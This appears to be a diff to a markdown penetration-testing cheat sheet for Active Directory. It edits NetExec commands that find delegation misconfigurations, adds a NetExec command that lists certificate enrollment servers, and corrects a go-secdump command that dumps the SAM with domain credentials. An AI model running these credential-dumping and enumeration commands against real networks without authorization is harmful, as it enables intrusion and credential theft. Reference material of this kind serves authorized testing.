@@ -717,7 +717,7 @@ u.objectid ENDS WITH "-548" RETURN q
   <summary> Netexec misconfigured delegation </summary> 
   
   ```shell
-  NetExec ldap <target_IP> -u <username> -p <password> --find-delegation
+  NetExec ldap <Domain_Controller_IP> -u <username> -p <password> --find-delegation
   ```
 </details> 
 
@@ -725,12 +725,20 @@ u.objectid ENDS WITH "-548" RETURN q
   <summary> Netexec trusted for delegation </summary> 
 
   ```shell
-  NetExec ldap <target_IP> -u <username> -p <password> --trusted-for-delegation
+  NetExec ldap <Domain_Controller_IP> -u <username> -p <password> --trusted-for-delegation
   ```
     
 </details> 
     
 # AD Certificates
+
+<details>
+  <summary> NetExec list all PKI enrollment servers </summary> 
+  
+  ```shell
+  NetExec ldap <Domain_Controller_IP> -u <username> -p <password> -M adcs
+  ```
+</details> 
 
 <details>
   <summary> ESC1 </summary> 
@@ -762,7 +770,7 @@ u.objectid ENDS WITH "-548" RETURN q
 
   ### go-secdump Dump SAM with domain user
   ```shell
-  ./go-secdump --domain <Domain_Controller_IP --host <target_IP> --user <username> ---pass <password> --hash <hash[LM:NT]]> --sam
+  ./go-secdump --domain <Domain_Controller_IP> --host <target_IP> --user <username> ---pass <password> --hash <hash[LM:NT]]> --sam
   ```
   
   ### NetExec Dump LSA with domain user
